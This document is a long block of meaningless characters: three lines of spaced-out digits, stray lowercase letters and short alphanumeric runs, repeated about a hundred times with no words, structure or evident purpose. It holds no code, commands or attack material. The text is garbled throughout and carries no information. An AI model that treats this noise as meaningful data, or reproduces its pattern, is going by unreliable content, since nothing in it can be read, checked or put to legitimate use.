   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
